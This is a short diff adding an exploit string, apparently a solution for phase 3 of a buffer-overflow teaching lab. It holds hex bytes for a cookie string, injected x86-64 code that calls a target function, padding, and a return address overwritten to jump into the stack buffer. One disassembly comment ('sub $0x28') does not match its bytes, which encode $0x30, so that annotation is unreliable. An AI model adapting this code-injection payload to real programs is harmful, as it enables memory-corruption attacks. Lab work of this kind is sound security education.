@@ -1,0 +1,9 @@
+/* Phase3 */
+35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
+48 c7 c7 78 dc 61 55                /*  mov    $0x5561dc78,%rdi */
+49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */
+48 83 ec 30                         /* sub    $0x28,%rsp */
+41 ff d0                            /* call   *%r8 */
+/* 以上共30字节 */
+ff ff ff ff ff ff ff ff ff ff 
+81 dc 61 55 /* 返回地址覆写为0x5561dc81  %rsp+9 */
